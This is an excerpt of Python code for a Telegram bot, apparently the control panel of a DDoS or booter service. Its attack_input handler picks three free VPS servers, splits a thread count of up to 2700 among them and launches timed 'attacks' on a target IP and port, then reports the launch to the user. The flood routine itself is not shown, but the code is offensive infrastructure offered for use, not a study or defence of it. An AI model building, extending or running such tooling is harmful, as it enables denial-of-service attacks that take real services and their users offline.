...
async def attack_input(update: Update, context: CallbackContext):
    ...
    max_allowed_duration = context.user_data.get('max_allowed_duration', 600)
    max_allowed_threads = context.user_data.get('max_allowed_threads', 2700)
    ...
    for vps in VPS_LIST:
        ...
        for attack in running_attacks.values():
            if attack['vps_ip'] == vps[0] and time.time() - attack['start_time'] < attack['duration']:
                vps_busy = True
                break
        if not vps_busy:
            available_vps.append(vps[0])

    if len(available_vps) < 3:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"❌ *Not enough available VPS servers!*\n"
            f"🌐 *Available VPS:* {len(available_vps)}/{len(VPS_LIST)}\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n"
            f"⏳ *Please try again later when servers are free*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    # Select 3 random available VPS
    selected_vps_ips = random.sample(available_vps, 3)
    
    # Calculate threads per VPS (divide total threads by 3)
    threads_per_vps = threads // 3
    ...
    attack_ids = []
    for i, vps_ip in enumerate(selected_vps_ips):
        # Distribute remaining threads to first few VPS
        final_threads = threads_per_vps + (1 if i < remaining_threads else 0)
    ...
    # Send attack start message showing all VPS and thread distribution
    attack_msg = await update.message.reply_text(
        ...
        f"📊 *Threads per VPS*: {threads_per_vps} (+1 on {remaining_threads} VPS)\n"
        f"👑 *Bot Owner:* {current_display_name}\n\n"
        f"🔥 *Attack launched successfully on 3 VPS!*",
        parse_mode='Markdown'
    )
    ...
    # Launch attacks on all 3 VPS
    for attack_id in attack_ids:
        vps_ip = attack_id.split('-')[-1]
        attack_details = running_attacks[attack_id]
        asyncio.create_task(run_attack(
            ip, port, duration, 
            attack_details['threads'], 
            vps_ip, attack_id, 
            update, context
        ))
